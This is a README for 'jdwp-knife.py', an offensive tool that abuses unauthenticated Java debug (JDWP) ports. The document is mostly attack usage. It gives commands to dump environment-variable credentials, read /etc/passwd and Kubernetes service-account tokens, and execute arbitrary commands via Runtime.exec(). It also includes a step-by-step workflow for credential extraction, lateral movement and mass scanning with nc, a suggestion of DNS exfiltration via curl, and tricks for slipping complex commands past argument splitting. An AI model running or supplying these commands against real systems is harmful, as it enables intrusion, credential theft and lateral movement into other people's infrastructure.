# jdwp-knife.py (remaster of jdwp-shellifier)

JDWP pentest tool. Extracts data from running JVMs via debug wire protocol — no shell, no outbound network, no file writes on target.

Based on hugsy's jdwp-shellifier, rewritten for Python 3 with data extraction capabilities.

## Requirements

- Python 3.6+
- Network access to target JDWP port (default 5005)
- No dependencies beyond stdlib

## Usage

```bash
# Dump environment variables (credentials, tokens, connection strings)
python3 jdwp-knife.py -t <target ip> -p 5005 --env

# Dump JVM system properties (java.home, user.name, os.*, classpath)
python3 jdwp-knife.py -t <target ip> -p 5005 --props

# List directory
python3 jdwp-knife.py -t <target ip> -p 5005 --ls /app

# Read file
python3 jdwp-knife.py -t <target ip> -p 5005 --cat /etc/passwd

# Command execution, it can write the stdout to the console (no need to exfiltrate data)
python3 jdwp-knife.py -t <target ip> -p 5005 --cmd "id"

# Combine multiple operations
python3 jdwp-knife.py -t <target ip> -p 5005 --env --ls /app --cat /app/application.yml

# Full enumeration
python3 jdwp-knife.py -t <target ip> -p 5005 --all

# Save output to file
python3 jdwp-knife.py -t <target ip> -p 5005 --env -o loot.txt

# Custom breakpoint method (default: java.lang.Thread.sleep)
python3 jdwp-knife.py -t <target ip> -p 5005 --env --break-on "java.lang.Object.wait"
```

## Options

| Flag | Description |
|------|-------------|
| `-t IP` | Target host (required) |
| `-p PORT` | JDWP port (default: 5005) |
| `--env` | Dump all environment variables via `System.getenv()` |
| `--props` | Dump JVM system properties via `System.getProperty()` |
| `--ls PATH` | List directory contents (repeatable) |
| `--cat FILE` | Read file contents (repeatable) |
| `--cmd CMD` | Execute command via `Runtime.exec()` (fire-and-forget, no stdout) |
| `--all` | Run `--env` + `--props` |
| `--break-on` | Method to set breakpoint on (default: `java.lang.Thread.sleep`) |
| `-o FILE` | Save all output to file |

## How it works

1. JDWP handshake (no auth — protocol has none)
2. Sets breakpoint on a sleeping thread (safe, non-business)
3. When breakpoint hits, invokes Java methods on the suspended thread
4. Reads results back through JDWP protocol
5. Resumes VM

`--env`, `--props`, `--ls`, `--cat` all return data through JDWP wire protocol — no network egress from target needed.

`--cmd` uses `Runtime.exec()` fire-and-forget — useful for DNS exfil via curl when you need side effects.

`--ls` and `--cat` use `Runtime.exec()` + `Process.getInputStream().readAllBytes()` — stdout is captured via JDWP array reads, not written to disk.

## Breakpoint safety

Only `SUSPEND_EVENTTHREAD` is used — only the thread that hits the breakpoint is paused, all other threads (Kafka, Tomcat, gRPC) continue running.

Safe breakpoint targets:
- `java.lang.Thread.sleep` (default) — idle/monitor threads
- `java.lang.Object.wait` — waiting threads

Avoid:
- `java.lang.ClassLoader.loadClass` — breaks class loading
- Kafka/Tomcat-specific methods — business impact

## Pentest workflow

```bash
# 1. Discover JDWP
echo "JDWP-Handshake" | nc -w3 TARGET 5005

# 2. Identify service
python3 jdwp-knife.py -t TARGET -p 5005 --props

# 3. Extract credentials
python3 jdwp-knife.py -t TARGET -p 5005 --env | grep -iE 'pass|secret|key|token|jdbc|aws'

# 4. Read config files
python3 jdwp-knife.py -t TARGET -p 5005 --cat /app/application.yml

# 5. K8s lateral movement
python3 jdwp-knife.py -t TARGET -p 5005 --cat /var/run/secrets/kubernetes.io/serviceaccount/token

# 6. Mass scan
for ip in $(cat targets.txt); do
  echo "JDWP-Handshake" | nc -w2 $ip 5005 2>/dev/null | grep -q JDWP && echo "[JDWP] $ip"
done
```

## Known limitations

- `--cat` on large files (100+ MB) may cause OOM on target 
- `Runtime.exec(String)` splits by spaces — no pipes or redirects in `--cmd` (use `${IFS}` or base64 trick for complex commands)
